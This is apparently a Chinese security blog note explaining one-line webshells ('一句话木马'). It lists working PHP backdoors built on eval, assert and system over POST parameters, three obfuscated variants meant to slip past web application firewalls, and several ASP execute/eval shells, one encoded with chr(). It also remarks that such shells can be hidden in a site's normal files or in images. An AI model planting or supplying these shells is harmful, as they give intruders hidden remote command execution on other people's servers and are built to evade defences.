---
# 当前页面内容标题
title: 一句话木马
# sidebar: heading
# 当前页面图标
icon: note
# 分类
category:
    - web安全
tabs: 
    - 一句话木马
sticky: false
# 是否收藏在博客主题的文章列表中，当填入数字时，数字越大，排名越靠前。
star: false
# 是否将该文章添加至文章列表中
article: true
# 是否将该文章添加至时间线中
timeline: true
# sidebar: heading
order: 4
date: 2023-02-16
# 浏览量
pageview: true
---
# 一句话木马

一句话木马的原理即可以执行传递上来变量的内容，变量名称即“一句话密码”，变量内容即后门执行代码，内容可以是list文件、上传及下载文件、数据库操作等等。

这类后门通常只一行代码，因此可以随意插入web站点的正常文件而并不影响原本代码的执行，甚至与正常图片的结合可以形成“图片马”。
体积小，隐蔽性强是一句话木马最大的优势。灵活的变量内容同时成就了很多经典的一句话操作客户端，如菜刀。

参考资料：

[一句话木马的原理,数据库操作等等。]: https://www.cnblogs.com/satuer/p/9349642.html#:~:text=%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E7%9A%84%E5%8E%9F%E7%90%86,%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C%E7%AD%89%E7%AD%89%E3%80%82
[史上最全的一句话木马]: https://blog.csdn.net/qq_44632668/article/details/97818432

## PHP

```php
<?php @eval($_POST['cmd']); ?>
```

可以执行通过`POST['cmd']`转递过来的php语句

```
<?php @assert($_POST['cmd']); ?>
```

assert在php7.0也不再是函数，变成了语言结构(不能使用可变函数了)

```php
<?php @system($_POST['cmd']); ?>
```

可以执行一句命令

过狗（绕过）：

1. str_replace

   ```
   <?php @$a = str_replace(x,"","axsxxsxexrxxt");@$a($_POST["cmd"]);?>
   ```

   `str_replace('x',"","axsxxsxexrxxt") = assert`最后变成`assert($_POST["cmd"])`

2. 通过获取$_POST的键名称绕过

   ```
   <?php $lang = (string)key($_POST);$lang($_POST[$lang]);?>
   ```

   首先传值`assert=phpinfo()`;

   服务器接收后会获取post的键名称，这时后`$lang`就等于`assert`

3. 通过`.`来拼接，`${"_PS"."ST"}`来传递值

   ```php
   <?php $k="ass"."ert"; $k(${"_PO"."ST"}['cmd'])?>
   ```

ASP

```php
<%execute(request(“cmd”))%>
```

```
<%Y=request(“xindong”)%> <%execute(Y)%>
```

```
<%eval (eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))(“xindong”))%>
```

